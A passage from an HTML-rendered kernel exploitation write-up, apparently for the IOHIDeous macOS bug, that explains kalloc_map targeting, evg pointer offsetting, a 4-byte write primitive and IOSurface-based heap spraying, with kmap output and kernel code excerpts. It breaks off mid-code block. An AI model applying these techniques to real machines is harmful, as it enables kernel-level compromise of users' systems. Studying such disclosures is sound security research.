&lt;p&gt;So let’s look at where allocations go. The prime kernel memory allocator used by virtually all of IOKit is &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc&lt;/code&gt;. Allocations smaller or equal to two page sizes (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; on x86(&lt;em&gt;64), &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8000&lt;/code&gt; on arm(64)), are passed on to &lt;code class=&quot;highlighter-rouge&quot;&gt;zalloc&lt;/code&gt; with a corresponding &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc.X&lt;/code&gt; zone handle. Allocations larger than two page sizes go to the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; first, and if that becomes full, directly to the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt; (allocations _a lot&lt;/em&gt; larger than two page sizes go directly to the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;, but that doesn’t affect us here).&lt;br/&gt;So we’ve got two possible targets: the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We’ll first look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt; - that is, the entire virtual address space of the kernel. Unlike the zalloc zones, maps employ no freelists, so allocations can happen practically anywhere. However, unless explicitly told not to, the &lt;code class=&quot;highlighter-rouge&quot;&gt;vm_map_*&lt;/code&gt; functions (through which both &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;IOMemoryDescriptor&lt;/code&gt; go) always put allocations in the lowest free address gap large enough for them. This doesn’t just mean that it’s likely that allocations we make are placed next to each other, but also that our shared memory was mapped in the same manner, and that the further we offset from it, the more likely an address is to still be free (so we could spray there). On Sierra that translates quite nicely into practice, but on High Sierra I found this way barred by the fact that my own allocations would happen at &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff92...&lt;/code&gt; addresses while the shared memory resided around &lt;code class=&quot;highlighter-rouge&quot;&gt;ffffff82...&lt;/code&gt;. I tracked this back mainly to a 64GB large mapping between the two:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;bash$ sudo kmap -e | fgrep '64G'
ffffff820c115000-ffffff920c355000     [  64G] -rw-/-rwx [map prv cp] ffffff820c115000 [0 0 0 0 0] 0000000e/82656611:&amp;lt;         2&amp;gt; 0,0 {         0,         0} VM compressor
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As is evident from its tag, this monster map belongs to the virtual memory compressor. It also exists on Sierra, but there our shared memory sits &lt;em&gt;after&lt;/em&gt; it whereas on High Sierra it sits &lt;em&gt;before&lt;/em&gt; it. This is most likely the result of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt; allocating the shared memory in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::init&lt;/code&gt; now, which is called much earlier than &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::createShmem&lt;/code&gt; ever could be. So, &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;: hot for Sierra, not for High Sierra.&lt;/p&gt;
&lt;p&gt;What about the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; then? This is a submap of the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt; with a fixed size, specifically a 32nd of the physical memory size (i.e. 16GB -&amp;gt; 512MB). On Sierra it is identifiable by its exact size and the fact that it is a &lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;, while on High Sierra it even got its own tag:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;bash$ sudo kmap -e | fgrep 'Kalloc'
ffffff81bca61000-ffffff81dca61000     [ 512M] -rw-/-rwx [map prv cp] ffffff81bca61000 [0 0 0 0 0] 0000000d/66b19131:&amp;lt;         2&amp;gt; 0,0 {         0,         0} Kalloc
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now that address looks like it could well be in range of our shared memory! I’ve done a couple of probes across reboots, and have sorted them by the distance between the kalloc map and our shared memory, for memory sizes of 8GB and 16GB (the &lt;code class=&quot;highlighter-rouge&quot;&gt;memsize=N&lt;/code&gt; boot-arg is wicked useful for that):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;10.13 8G
shmem               kalloc start        kalloc end          start diff          end diff
ffffff812a681000    ffffff80f0cd4000    ffffff8100cd4000    00000000399ad000    00000000299ad000
ffffff8116089000    ffffff80dc695000    ffffff80ec695000    00000000399f4000    00000000299f4000
ffffff8119735000    ffffff80dfd24000    ffffff80efd24000    0000000039a11000    0000000029a11000

10.13 16G
shmem               kalloc start        kalloc end          start diff          end diff
ffffff82096c0000    ffffff81bc97c000    ffffff81dc97c000    000000004cd44000    000000002cd44000
ffffff8205531000    ffffff81b87ec000    ffffff81d87ec000    000000004cd45000    000000002cd45000
ffffff82005cd000    ffffff81b37e5000    ffffff81d37e5000    000000004cde8000    000000002cde8000
ffffff81ec925000    ffffff819fb38000    ffffff81bfb38000    000000004cded000    000000002cded000
ffffff820383d000    ffffff81b6a48000    ffffff81d6a48000    000000004cdf5000    000000002cdf5000
ffffff81efedd000    ffffff81a30df000    ffffff81c30df000    000000004cdfe000    000000002cdfe000
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Nice, all differences are less than the 2GB we can offset! (Note that the kalloc addresses are lower than the shmem ones, so 1. the differences are negative and 2. we’re really lucky to have our offset value &lt;code class=&quot;highlighter-rouge&quot;&gt;signed&lt;/code&gt;. :P) I’ve done the same statistics on Sierra as well (see &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/data/shmem.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data/shmem.txt&lt;/code&gt;&lt;/a&gt;), but there all differences are larger than 64GB (as is to be expected). So on High Sierra we’ll go for the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that we have our targets set, we can look at how to maximise the chance of landing in a structure sprayed by us. On both maps, allocations usually happen at the lowest possible address, so the higher an address, the less likely it should be to have been previously allocated, i.e. the more likely it should be to be allocated by us.&lt;/p&gt;
&lt;p&gt;For Sierra/the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt; this yields the strategy:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Fill the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Make &amp;gt;2GB worth of allocations on the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; by 2GB.&lt;/li&gt;
&lt;li&gt;Read or corrupt the structure at that offset.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;And for High Sierra/the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Fill the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; by ca. &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x30000000&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Read or corrupt the structure at that offset.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Notes:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sysctlbyname(&quot;hw.memsize&quot;)&lt;/code&gt; reveals the system memory size, from which the size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; can be derived.&lt;/li&gt;
&lt;li&gt;The value &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x30000000&lt;/code&gt; is quite arbitrary. In order to land inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt;, we need a negative offset that is larger than the biggest possible difference between the end of the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; and the beginning of our shared memory, but which is also smaller than the smallest possible difference between the &lt;em&gt;beginning&lt;/em&gt; of the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; and the beginning of our shared memory. Ideally it should also be as small as possible, so that we land closer to the end of the map. With biggest and smallest observed differences being &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x2cdfe000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x399ad000&lt;/code&gt;, I have chosen &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x30000000&lt;/code&gt; as a conservative guess. It is most likely possible to derive a more fitting value based on the actual memory size (which seems to affect the differences) by doing a lot more statistics, but I eventually grew tired of rebooting, and &lt;code class=&quot;highlighter-rouge&quot;&gt;-0x30000000&lt;/code&gt; works just fine for me - you can change &lt;code class=&quot;highlighter-rouge&quot;&gt;KALLOC_OFFSET_AMOUNT&lt;/code&gt; in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/config.h&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/config.h&lt;/code&gt;&lt;/a&gt; if you like a different value better.&lt;/li&gt;
&lt;li&gt;Making 2GB worth of allocations takes well over 10 minutes on my machine, which is longer than I like to wait. I have found that allocating just 768MB and offsetting by a little bit less than that still worked every time for me though. I have added both configurations to &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/config.h&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/config.h&lt;/code&gt;&lt;/a&gt; with 768MB being the default, and 2GB being selectable through a &lt;code class=&quot;highlighter-rouge&quot;&gt;-DPLAY_IT_SAFE&lt;/code&gt; compiler flag.&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;reading-and-writing-memory&quot;&gt;Reading and writing memory&lt;/h3&gt;
&lt;p&gt;First of all we have the general problem that we don’t know whether offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; by a certain amount places it at the &lt;em&gt;beginning&lt;/em&gt; of a sprayed memory structure or somewhere in the &lt;em&gt;middle&lt;/em&gt; of it. We &lt;em&gt;do&lt;/em&gt; know that allocations start at page boundaries though (including our shared memory), are rounded up to a multiple of the page size, and must be bigger than &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;. If nothing else helps, we can spray objects of size &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt; and then there will be only three possible offsets: &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x1000&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;x + 0x2000&lt;/code&gt;. So if we can perform our read or write operation multiple times in sequence, we can just do it three times at all offsets. If we can’t do that, at least we still get a 1 in 3 chance of getting it right.&lt;/p&gt;
&lt;p&gt;Now, writing memory is quite easy, at least as much as 4 bytes are concerned. &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::initShmem&lt;/code&gt; takes a single argument &lt;code class=&quot;highlighter-rouge&quot;&gt;bool clean&lt;/code&gt;, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt; if the memory has previously existed already, and which is used as follows:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;oldFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So writing 4 bytes is a simple as:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Put our data in &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;And we have our 4 bytes copied. (Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;shmem_addr&lt;/code&gt; is used as source rather than &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, so we cannot copy anything other than the true &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt;.) Of course the other few dozen kilobytes of memory belonging to the structure are quite a an obstacle if we want to rewrite pointers, as they threaten to lay waste to everything in the vicinity. It turns out that there are quite a lot of gaps though which are left untouched by initialisation and if special care is taken, this method can actually suffice. (Note that the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;bzero&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;initShmem&lt;/code&gt; also uses &lt;code class=&quot;highlighter-rouge&quot;&gt;shmem_addr&lt;/code&gt; as argument rather than &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, so it does no harm either to the memory we offset to.)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/exploit.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/exploit.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;For reading memory it is kind of a fundamental requirement though that we don’t destroy the target structure, and the same could also still prove very useful for writing. With initialisation pretty much out of our control, the only way we can achieve this is if the initialisation of the target memory happens &lt;em&gt;after&lt;/em&gt; the initialisation and offsetting of our shared memory. In most cases this means we have to reallocate the target objects after offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, but we could also have a buffer that is (re-)filled long after its allocation. The general idea is:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Make a lot of kalloc allocations using objects whose corruption has no bad consequence (e.g. buffers).&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Reallocate the memory intersecting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; (possibly using different objects).&lt;/li&gt;
&lt;li&gt;Perform some read or write operation (we’ll get to that in a bit).&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Point 3 is a bit tricky to pull off, since there is no general way of telling which objects exactly intersect with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;. A naive implementation would just reallocate &lt;em&gt;all&lt;/em&gt; sprayed objects - which works, but has terrible performance. So, it’s time for some heap feng shui! The &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt; API offers a way to “attach CF property list types to an IOSurface buffer” - more precisely, you can store arbitrarily many results of &lt;code class=&quot;highlighter-rouge&quot;&gt;OSUnserializeXML&lt;/code&gt; in kernelland, as well as read those back or delete them at any time. Seems like freaking made for our cause! Using that, we can do the following:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Create an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Spray the heap by attaching lots of &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt;s to the surface.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Read back the stored strings.&lt;/li&gt;
&lt;li&gt;Detect where &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; initialisation happened.&lt;/li&gt;
&lt;li&gt;Possibly reposition &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; for alignment.&lt;/li&gt;
&lt;li&gt;Free the intersecting string(s).&lt;/li&gt;
&lt;li&gt;Reallocate the memory with a useful data structure.&lt;/li&gt;
&lt;li&gt;Read from or write to that structure.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Two notes regarding the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;I would’ve used &lt;code class=&quot;highlighter-rouge&quot;&gt;OSData&lt;/code&gt;, but it turns out that one has been changed to use &lt;code class=&quot;highlighter-rouge&quot;&gt;kmem_alloc(kernel_map)&lt;/code&gt; rather than &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc&lt;/code&gt; for allocations larger than one page. In other words, &lt;code class=&quot;highlighter-rouge&quot;&gt;OSData&lt;/code&gt; buffers will never go to the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; anymore.&lt;/li&gt;
&lt;li&gt;The serialised format of an &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt; does not contain a null terminator (unlike &lt;code class=&quot;highlighter-rouge&quot;&gt;OSSymbol&lt;/code&gt;), however one is added when instantiating/unserialising it. Thus to occupy &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt; bytes, the serialised length has to actually be &lt;code class=&quot;highlighter-rouge&quot;&gt;N-1&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;And a note regarding &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt; properties: the exported API only supports CF objects, but for fine-grained control over the data we send as well as for increased performance, I want to use the binary data format directly. For that I go through IOKit functions rather than IOSurface ones, which involves four external method invocations on an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurfaceRootUserClient&lt;/code&gt;:&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;External method &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;br/&gt;This creates a new &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt;. As struct input it takes serialised plist properties that specify the surface’s attributes (same as what you’d pass to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurfaceCreate&lt;/code&gt;) and as struct output it returns some data of which I only know that it contains an identifier at offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt;. The kernel declares this output as having a max size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6c8&lt;/code&gt; bytes, so I just use this construct:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;surface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Whether that field is truly the surface’s ID I don’t know, but we have to pass that value to other functions later in order to specify the surface we wanna operate on.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;External method &lt;code class=&quot;highlighter-rouge&quot;&gt;9&lt;/code&gt;.&lt;br/&gt;This attaches a single property with a name to a surface. As struct input it takes serialised plist data, except that they’re prefixed with an 8-byte header where the first 4 bytes are the “ID” from above, and the remaining 4 bytes are likely just padding. The property and its name are expected to be contained in a top-level array, with the property being at index &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and the name at index &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;. It has a 4-byte struct output, but I have no idea what that is.&lt;/li&gt;
&lt;li&gt;External method &lt;code class=&quot;highlighter-rouge&quot;&gt;10&lt;/code&gt;.&lt;br/&gt;This serialises and retrieves either a single named property, or all properties if no name is given. As struct input this method takes the same header as before, but instead of serialised plist data it just takes the property’s name as null-terminated C string. As struct output it returns the serialised property (or properties) in binary format.&lt;/li&gt;
&lt;li&gt;External method &lt;code class=&quot;highlighter-rouge&quot;&gt;11&lt;/code&gt;.&lt;br/&gt;This deletes a named property. Struct input is the same as for retrieving a property, and struct output is again 4 bytes whose meaning I don’t know.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;With that settled, let’s look at how we can read and write memory after &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; has been moved already.&lt;/p&gt;
&lt;p&gt;Writing is much simpler so I’ll do that first. We’ll just use &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt; again, since there’s such a nice function for it:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOHIDSystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;updateEventFlagsGated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OSObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventsOpen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEYBOARD_FLAGSMASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEYBOARD_FLAGSMASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;nanoseconds_to_absolutetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clickTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Unlike most other API functions, this &lt;em&gt;isn’t&lt;/em&gt; exported as an external method of any UserClient, but is instead handled in &lt;code class=&quot;highlighter-rouge&quot;&gt;setProperties&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;8.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
